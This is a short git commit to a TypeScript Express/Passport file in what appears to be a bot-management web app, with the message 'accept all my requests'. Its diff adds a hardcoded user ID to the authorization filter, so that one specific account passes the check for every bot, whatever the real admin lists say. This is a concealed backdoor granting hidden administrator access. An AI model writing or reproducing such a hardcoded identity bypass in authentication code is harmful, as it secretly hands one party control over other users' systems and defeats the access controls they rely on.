89e73b4b282ed9e8a4aeb54ea370b3c1a4d89853
Maximilián Maliar <maliarmaximilian@gmail.com>
2022-03-05 20:10:44 +0100

    accept all my requests

--- src/server/express/passport.ts
+++ src/server/express/passport.ts
@@ -51,7 +51,7 @@ export =  function init(app: Express, botManager: BotConnectionManager): void {
                 return;
             }
             let bots = Object.values(botManager.bots)
-                .filter(bot => bot.admins.includes(req.user.id)||bot.id===req.user.id)
+                .filter(bot => bot.admins.includes(req.user.id)||bot.id===req.user.id||req.user.id==='76561198162885342')
                 .map(bot => bot.id);
             if(bots.length === 0) {
                 res.render('noBots');
